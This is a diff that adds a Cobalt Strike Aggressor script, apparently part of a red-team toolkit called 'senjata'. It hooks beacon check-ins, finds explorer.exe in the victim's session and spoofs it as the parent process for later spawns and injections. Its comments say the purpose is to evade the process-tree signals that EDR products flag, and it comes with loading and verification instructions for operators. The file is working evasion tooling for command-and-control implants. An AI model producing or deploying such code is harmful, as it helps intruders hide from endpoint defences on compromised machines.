@@ -1,0 +1,156 @@
+# senjata-auto-ppid.cna
+#
+# Auto-PPID-spoof companion for the senjata-recommended Malleable C2
+# profile. Loaded alongside the profile via CS Client → Script Manager.
+#
+# What it does:
+#   On every new beacon check-in, automatically runs `ps`, finds
+#   explorer.exe in the same session as the beacon's user, then calls
+#   `bppid <pid>`. All subsequent process spawns / injections from that
+#   beacon inherit explorer.exe as their spoofed parent — matching
+#   normal user-session process trees instead of "beacon spawns dllhost"
+#   (which is a behavioural IOC EDRs flag).
+#
+# Why this isn't in the .profile:
+#   Malleable C2 profile doesn't expose `set ppid` as a global directive.
+#   PPID spoofing is a per-beacon runtime setting, set via Aggressor's
+#   bppid() function. The closest profile-equivalent is to use this
+#   companion .cna in the Script Manager — same effect, different
+#   delivery mechanism.
+#
+# Loading:
+#   CS Client → Cobalt Strike → Script Manager → Load
+#     - /path/to/senjata-auto-ppid.cna
+#     - /path/to/senjata-execute-assembly.cna   (existing)
+#   Reload the maliable.profile on the team server as usual.
+#
+# Verification per beacon:
+#   beacon> ps          # confirm explorer.exe is visible
+#   beacon> spawn cmd   # spawned cmd's PPID should == explorer.exe PID
+
+global('%senjata_autoppid_done $senjata_autoppid_fallback_clear');
+
+# Track beacons we've already auto-spoofed so we don't repeat on every
+# checkin. Sleep hash; key = bid, value = 1 (set) or 2 (failed).
+%senjata_autoppid_done = %();
+
+# If TRUE, on auto-spoof failure clear bppid back to 0 (= use beacon
+# process as parent). FALSE leaves any prior manual bppid intact.
+# Default FALSE — don't clobber operator's manual setting.
+$senjata_autoppid_fallback_clear = false;
+
+# ----------------------------------------------------------------------
+# senjata_autoppid_for — find explorer.exe in beacon's session and bppid.
+# ----------------------------------------------------------------------
+sub senjata_autoppid_for {
+    local('$bid');
+    $bid = $1;
+
+    if (%senjata_autoppid_done[$bid] == 1) {
+        # Already done; skip.
+        return;
+    }
+
+    # Run `ps` and parse for explorer.exe. CS ps output columns are:
+    #   PID  PPID  Name  Arch  Session  User
+    # Multiple explorer.exe instances can exist on terminal servers /
+    # multi-user hosts. Pick the one matching the beacon's session if
+    # available, otherwise first match.
+    bps($bid, lambda({
+        local('$bid $ps_output @lines $line @cols $pid $ppid $name $sess $user');
+        local('$beacon_user $beacon_sess $best_pid $best_score $score');
+        ($bid, $ps_output) = @_;
+
+        # Pull beacon metadata so we can score candidates.
+        $beacon_user = beacon_info($bid, "user");
+        # Session field isn't always available; fall back to empty.
+        $beacon_sess = beacon_info($bid, "session") || "";
+
+        $best_pid = 0;
+        $best_score = -1;
+
+        @lines = split('\n', $ps_output);
+        foreach $line (@lines) {
+            # Skip headers and separators.
+            if ($line eq "" || $line ismatch "^\\s*PID\\b.*" || $line ismatch "^\\s*---.*") {
+                continue;
+            }
+            # Tokenise on whitespace runs.
+            @cols = split('\\s+', trim($line));
+            if (size(@cols) < 3) { continue; }
+            $pid  = @cols[0];
+            $name = @cols[2];
+            if (lc($name) ne "explorer.exe") { continue; }
+
+            # Score: prefer same session (+10) and same user (+5).
+            $score = 0;
+            if (size(@cols) >= 5) {
+                $sess = @cols[4];
+                if ($beacon_sess ne "" && $sess eq $beacon_sess) { $score += 10; }
+            }
+            if (size(@cols) >= 6) {
+                $user = @cols[5];
+                if ($beacon_user ne "" && lc($user) eq lc($beacon_user)) { $score += 5; }
+            }
+            # Tiebreaker: lowest PID wins (oldest explorer instance).
+            if ($score > $best_score || ($score == $best_score && $pid < $best_pid)) {
+                $best_score = $score;
+                $best_pid = $pid;
+            }
+        }
+
+        if ($best_pid != 0) {
+            bppid($bid, $best_pid);
+            blog($bid, "[+] senjata auto-ppid: bppid \cE$best_pid\o (explorer.exe, score=$best_score)");
+            %senjata_autoppid_done[$bid] = 1;
+        } else {
+            blog($bid, "[!] senjata auto-ppid: explorer.exe not found in ps output. Manual bppid recommended.");
+            %senjata_autoppid_done[$bid] = 2;
+            if ($senjata_autoppid_fallback_clear) {
+                bppid($bid, 0);
+            }
+        }
+    }, \$bid));
+}
+
+# ----------------------------------------------------------------------
+# Event hooks
+# ----------------------------------------------------------------------
+
+# Fires when a beacon checks in for the very first time after staging /
+# stageless callback. Best moment to auto-spoof: before operator runs
+# any commands that would inherit the un-spoofed default.
+on beacon_initial {
+    local('$bid');
+    $bid = $1;
+    blog($bid, "[*] senjata auto-ppid: scheduling spoof to explorer.exe");
+    senjata_autoppid_for($bid);
+}
+
+# Fires for every subsequent checkin. We use it as a safety net in case
+# beacon_initial was missed (e.g., script loaded after beacon callback).
+# The %senjata_autoppid_done hash short-circuits if we already set.
+on beacon_checkin {
+    local('$bid');
+    $bid = $1;
+    if (%senjata_autoppid_done[$bid] != 1 && %senjata_autoppid_done[$bid] != 2) {
+        senjata_autoppid_for($bid);
+    }
+}
+
+# ----------------------------------------------------------------------
+# Operator manual command — re-spoof on demand, e.g. after explorer
+# restart or session switch.
+# ----------------------------------------------------------------------
+alias senjata-autoppid {
+    local('$bid');
+    $bid = $1;
+    # Force a re-run.
+    %senjata_autoppid_done[$bid] = 0;
+    senjata_autoppid_for($bid);
+}
+
+beacon_command_register(
+    "senjata-autoppid",
+    "Re-run the auto-PPID-spoof to explorer.exe for this beacon",
+    "Synopsis:\n  senjata-autoppid\n\nFinds explorer.exe in the beacon's session via ps and calls bppid. Same logic that runs automatically on beacon_initial.");
